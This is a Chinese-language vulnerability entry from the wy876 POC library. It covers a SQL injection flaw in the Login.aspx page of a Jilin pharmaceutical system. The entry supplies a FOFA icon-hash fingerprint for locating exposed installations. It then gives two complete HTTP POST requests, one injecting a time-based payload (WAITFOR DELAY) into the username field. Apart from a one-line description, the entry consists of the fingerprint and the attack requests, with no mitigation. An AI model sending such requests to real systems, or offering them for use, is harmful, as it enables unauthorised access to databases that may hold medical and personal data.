---
fofa: "icon_hash="
source: "wy876 漏洞文库"
---

# 吉林医药系统Login存在SQL注入漏洞

# 一、漏洞简介
医药系统Login存在SQL注入漏洞

# 二、影响版本
+ 吉林医药系统

# 三、资产测绘
+ fofa`icon_hash="775044030"`


# 四、漏洞复现
```plain
POST /Login.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Cookie: ASP.NET_SessionId=ojsdqzhri20qo0zd3zkonnpx
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 293

__VIEWSTATE=%2FwEPDwUKLTY0OTc3MzY5OA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICAw9kFgICBA8WAh4JaW5uZXJodG1sBSHlkInmnpfnnIHogZrliJvljLvoja%2FmnInpmZDlhazlj7hkZFiU%2FDEzLkPCmDf498pGBLrtD3FC5XsVsdyX0eaNHaa1&tbUser=admin%27%3BWAITFOR+DELAY+%270%3A0%3A5%27--&tbPassword=admin&btnLogin=+%B5%C7+%C2%BC+&hfSubmit=&__VIEWSTATEGENERATOR=C2EE9ABB
```


```plain
POST /Login.aspx HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
Cookie: ASP.NET_SessionId=ojsdqzhri20qo0zd3zkonnpx
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Length: 293

__VIEWSTATE=%2FwEPDwUKLTY0OTc3MzY5OA8WAh4TVmFsaWRhdGVSZXF1ZXN0TW9kZQIBFgICAw9kFgICBA8WAh4JaW5uZXJodG1sBSHlkInmnpfnnIHogZrliJvljLvoja%2FmnInpmZDlhazlj7hkZFiU%2FDEzLkPCmDf498pGBLrtD3FC5XsVsdyX0eaNHaa1&tbUser=admin&tbPassword=admin&btnLogin=+%B5%C7+%C2%BC+&hfSubmit=&__VIEWSTATEGENERATOR=C2EE9ABB
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gsfq16xdvbag4hu6>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
